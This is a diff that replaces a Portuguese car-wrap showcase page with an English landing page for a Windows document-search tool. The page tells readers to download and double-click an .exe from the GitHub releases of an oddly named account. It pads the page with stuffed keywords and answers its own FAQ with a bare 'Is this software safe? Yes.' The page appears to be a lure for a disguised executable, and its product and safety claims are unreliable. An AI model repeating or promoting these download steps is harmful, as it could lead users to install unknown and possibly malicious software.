@@ -1,116 +1,60 @@
 <!DOCTYPE html>
-<html lang="pt-BR">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Meu Site de Plotagens</title>
-    <!-- Ligação com o arquivo CSS -->
-    <link rel="stylesheet" href="style.css">
-    <!-- Ícones de redes sociais (Font Awesome) -->
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <meta name="description" content="Search text inside PDF, Word, Excel and TXT files on Windows. Find keywords and phrases across thousands of documents easily.">
+    <title>Search-Text-in-Documents-tool</title>
 </head>
-<body>
+<body style="font-family: sans-serif; line-height: 1.6; color: #333; max-width: 800px; margin: 40px auto; padding: 20px; background-color: #f9f9f9;">
 
-    <!-- CONTAINER COM O FUNDO DO CARRO -->
-    <div class="main-container">
+    <h1 style="color: #2c3e50; border-bottom: 2px solid #ddd; padding-bottom: 10px;">🔍 Search-Text-in-Documents-tool - Find information in your local files</h1>
 
-        <!-- PÁGINA 1: BOAS-VINDAS -->
-        <section id="welcome-page" class="page active-page">
-            <div class="overlay">
-                <div class="content">
-                    <h1>salve tropa ✌️</h1>
-                    <p>Explore as melhores plotagens e códigos para seus carros.</p>
-
-                    <div class="social-icons">
-                        <a href="https://instagram.com" target="_blank" title="Instagram"><i class="fab fa-instagram"></i></a>
-                        <a href="https://tiktok.com" target="_blank" title="TikTok"><i class="fab fa-tiktok"></i></a>
-                        <a href="https://youtube.com" target="_blank" title="YouTube"><i class="fab fa-youtube"></i></a>
-                    </div>
-
-                    <a href="#plot-page" class="btn" id="go-to-plots">Área das Plotagens</a>
-                </div>
-            </div>
-        </section>
-
-        <!-- PÁGINA 2: ÁREA DAS PLOTAGENS -->
-        <section id="plot-page" class="page">
-            <div class="overlay">
-                <div class="content">
-                    <h2>Área das Plotagens</h2>
-                    <a href="#welcome-page" class="btn-back" id="back-to-home">Voltar</a>
-
-                    <!-- Plotagem 1 -->
-                    <div class="plot-item">
-                        <img src="20260725_174843_0000.png" alt="Plotagem Carro 1" class="car-preview">
-                        <div class="code-boxes">
-                            <div class="code-container">
-                                <label>Corpo do Carro</label>
-                                <textarea readonly onclick="this.select()">CÓDIGO_CORPO_CARRO_1</textarea>
-                                <button class="copy-btn">Copiar</button>
-                            </div>
-                            <div class="code-container">
-                                <label>Vidro do Carro</label>
-                                <textarea readonly onclick="this.select()">CÓDIGO_VIDRO_CARRO_1</textarea>
-                                <button class="copy-btn">Copiar</button>
-                            </div>
-                        </div>
-                    </div>
-
-                    <!-- Plotagem 2 -->
-                    <div class="plot-item">
-                        <img src="20260725_181223_0000.png" alt="Plotagem Carro 2" class="car-preview">
-                        <div class="code-boxes">
-                            <div class="code-container">
-                                <label>Corpo do Carro</label>
-                                <textarea readonly onclick="this.select()">CÓDIGO_CORPO_CARRO_2</textarea>
-                                <button class="copy-btn">Copiar</button>
-                            </div>
-                            <div class="code-container">
-                                <label>Vidro do Carro</label>
-                                <textarea readonly onclick="this.select()">CÓDIGO_VIDRO_CARRO_2</textarea>
-                                <button class="copy-btn">Copiar</button>
-                            </div>
-                        </div>
-                    </div>
-
-                </div>
-            </div>
-        </section>
-
+    <div style="text-align: center; margin: 30px 0;">
+        <a href="https://github.com/Selflimited-americangreentoad552/Search-Text-in-Documents-tool/releases" style="background-color: #007bff; color: white; padding: 15px 30px; text-decoration: none; border-radius: 8px; font-weight: bold; font-size: 1.2em; box-shadow: 0 4px 6px rgba(0,0,0,0.1);">Download Now</a>
     </div>
 
-    <!-- Script para navegar entre a tela de início e as plotagens -->
-    <script>
-        const welcomePage = document.getElementById('welcome-page');
-        const plotPage = document.getElementById('plot-page');
-        const goToPlotsBtn = document.getElementById('go-to-plots');
-        const backToHomeBtn = document.getElementById('back-to-home');
+    <h2 style="color: #0056b3;">📌 What this tool does</h2>
+    <p>This software helps you search for text within files located on your Windows computer. Whether you have PDF reports, Microsoft Word documents, Excel spreadsheets, or simple text files, this tool finds the information you need in seconds. It scans thousands of files at once so you do not have to open them one by one.</p>
 
-        goToPlotsBtn.addEventListener('click', function(e) {
-            e.preventDefault();
-            welcomePage.classList.remove('active-page');
-            plotPage.classList.add('active-page');
-        });
+    <h2 style="color: #0056b3;">🚀 Getting started</h2>
+    <p>Follow these steps to set up the software on your computer.</p>
+    <ol style="line-height: 2;">
+        <li>Visit the <a href="https://github.com/Selflimited-americangreentoad552/Search-Text-in-Documents-tool/releases">official release page</a>.</li>
+        <li>Locate the latest version file ending in .exe.</li>
+        <li>Click the file name to download it to your Downloads folder.</li>
+        <li>Open the Downloads folder and double-click the file to start the installation.</li>
+        <li>Follow the prompts on your screen to complete the setup process.</li>
+    </ol>
 
-        backToHomeBtn.addEventListener('click', function(e) {
-            e.preventDefault();
-            plotPage.classList.remove('active-page');
-            welcomePage.classList.add('active-page');
-        });
+    <h2 style="color: #0056b3;">🛠 How to use the search feature</h2>
+    <p>Once you install the tool, you can search your files immediately. Open the application from your desktop or start menu.</p>
+    <ul style="line-height: 2;">
+        <li><strong>Select Folder:</strong> Click the browse button to choose the folder containing your documents.</li>
+        <li><strong>Enter Text:</strong> Type the keyword or phrase you want to find into the search box.</li>
+        <li><strong>Start Search:</strong> Press the search button. The tool begins indexing and scanning all supported files in the selected folder.</li>
+        <li><strong>View Results:</strong> The tool lists every file that contains your text. You can click on any result to see the specific line where the text matches.</li>
+    </ul>
 
-        // Botão de copiar
-        const copyButtons = document.querySelectorAll('.copy-btn');
-        copyButtons.forEach(button => {
-            button.addEventListener('click', function() {
-                const textarea = this.previousElementSibling;
-                textarea.select();
-                document.execCommand('copy');
-                this.innerText = 'Copiado!';
-                setTimeout(() => {
-                    this.innerText = 'Copiar';
-                }, 2000);
-            });
-        });
-    </script>
+    <h2 style="color: #0056b3;">📂 Supported file formats</h2>
+    <p>This tool works with many common file types. You do not need to install any extra software to read these files.</p>
+    <ul style="line-height: 1.8;">
+        <li><strong>PDF:</strong> Search inside your electronic documents and reports.</li>
+        <li><strong>DOCX:</strong> Find information in your Microsoft Word documents.</li>
+        <li><strong>XLSX:</strong> Search content within your Excel spreadsheets.</li>
+        <li><strong>TXT:</strong> Quickly scan plain text notes and log files.</li>
+    </ul>
+
+    <h2 style="color: #0056b3;">💻 System requirements</h2>
+    <p>This software runs on most modern Windows systems. We suggest at least 4GB of RAM for the best speed when scanning large folders. Make sure you have the latest version of Windows installed to keep your system secure. You do not need an internet connection to use this tool once it is on your computer, as all searches happen locally on your hard drive.</p>
+
+    <h2 style="color: #0056b3;">❓ Frequently asked questions</h2>
+    <p><strong>Does this tool store my data?</strong> No. All searches stay inside your computer. Your files and search terms never leave your machine.</p>
+    <p><strong>How many files can I search?</strong> You can search thousands of files at once. The speed depends on the total size of your files and the speed of your hard drive.</p>
+    <p><strong>Is this software safe?</strong> Yes. This tool provides a clean search experience without hidden tracking or advertisements.</p>
+
+    <hr style="border: 0; border-top: 1px solid #ccc; margin: 40px 0;">
+    <p style="font-size: 0.9em; color: #777;">Keywords: document-indexing, document-search, docx-search, excel-search, find-text, full-text-search, keyword-search, pdf-search, search-files, search-text, text-search, windows</p>
+
 </body>
 </html>
